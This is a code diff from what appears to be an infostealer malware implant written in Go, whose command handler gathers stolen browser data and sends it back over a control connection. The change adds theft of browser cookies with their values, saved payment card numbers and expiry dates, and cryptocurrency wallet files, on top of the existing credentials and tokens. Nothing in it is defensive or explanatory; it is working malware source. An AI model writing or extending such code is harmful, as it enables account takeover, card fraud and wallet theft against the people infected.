@@ -12,6 +12,7 @@ import (
 
 func HandleSteal(ctx context.Context, env *rt.Env, cmdID string) error {
 	r := stealer.Run()
+
 	creds := make([]wire.StealCredential, 0, len(r.Credentials))
 	for _, c := range r.Credentials {
 		creds = append(creds, wire.StealCredential{
@@ -22,11 +23,49 @@ func HandleSteal(ctx context.Context, env *rt.Env, cmdID string) error {
 			Password: c.Password,
 		})
 	}
+
+	cookies := make([]wire.StealCookie, 0, len(r.Cookies))
+	for _, c := range r.Cookies {
+		cookies = append(cookies, wire.StealCookie{
+			Browser:  c.Browser,
+			Profile:  c.Profile,
+			Host:     c.Host,
+			Name:     c.Name,
+			Value:    c.Value,
+			Path:     c.Path,
+			IsSecure: c.IsSecure,
+		})
+	}
+
+	cards := make([]wire.StealCard, 0, len(r.Cards))
+	for _, c := range r.Cards {
+		cards = append(cards, wire.StealCard{
+			Browser:     c.Browser,
+			Profile:     c.Profile,
+			Name:        c.Name,
+			Number:      c.Number,
+			ExpiryMonth: c.ExpiryMonth,
+			ExpiryYear:  c.ExpiryYear,
+		})
+	}
+
+	wallets := make([]wire.StealWallet, 0, len(r.Wallets))
+	for _, w := range r.Wallets {
+		wallets = append(wallets, wire.StealWallet{
+			Wallet:   w.Wallet,
+			Filename: w.Filename,
+			DataB64:  w.DataB64,
+		})
+	}
+
 	return wire.WriteMsg(ctx, env.Conn, wire.StealResult{
 		Type:        "steal_result",
 		CommandID:   cmdID,
 		Credentials: creds,
+		Cookies:     cookies,
+		Cards:       cards,
 		Tokens:      r.Tokens,
+		Wallets:     wallets,
 		Errors:      r.Errors,
 	})
 }
